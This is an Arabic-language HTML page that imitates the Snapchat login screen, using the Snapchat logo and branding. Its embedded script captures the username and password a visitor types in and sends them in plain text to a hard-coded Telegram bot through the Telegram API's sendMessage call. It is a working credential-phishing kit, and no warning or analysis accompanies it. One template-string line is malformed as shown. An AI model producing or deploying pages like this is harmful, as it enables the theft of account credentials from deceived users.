<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - سناب شات</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f8f8f8;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding-top: 50px;
        }
        .logo {
            text-align: center;
        }
        .logo img {
            width: 120px;
        }
        .form-container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .form-container input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ddd;
            font-size: 16px;
        }
        .form-container button {
            width: 100%;
            padding: 15px;
            background-color: #FFFC00;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            color: white;
            cursor: pointer;
        }
        .form-container button:hover {
            background-color: #FFC600;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/56/Snapchat_logo_2019.svg/2048px-Snapchat_logo_2019.svg.png" alt="Snapchat">
        </div>
        <div class="form-container">
            <form id="loginForm">
                <input type="text" id="username" name="username" placeholder="اسم المستخدم" required><br>
                <input type="password" id="password" name="password" placeholder="كلمة المرور" required><br>
                <button type="submit">تسجيل الدخول</button>
            </form>
        </div>
        <div class="footer">
            <p>لا تمتلك حساب؟ <a href="#">إنشاء حساب</a></p>
        </div>
    </div>

    <script>
        const botToken = '8115449101:AAEHjtM43eZLihv_kY6dU19S0mXSsy1C7qY';
        const chatId = '5192103424';

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // منع الإرسال التلقائي للنموذج

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // إنشاء الرسالة التي سيتم إرسالها إلى بوت تلجرام
            const message = تم تسجيل الدخول بنجاح!\nاسم المستخدم: ${username}\nكلمة المرور: ${password};

            // إرسال البيانات إلى البوت عبر API تلجرام
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert('تم إرسال البيانات بنجاح إلى بوت تلجرام!');
                    } else {
                        alert('فشل إرسال البيانات.');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('حدث خطأ أثناء إرسال البيانات.');
                });
        });
    </script>
</body>
</html>
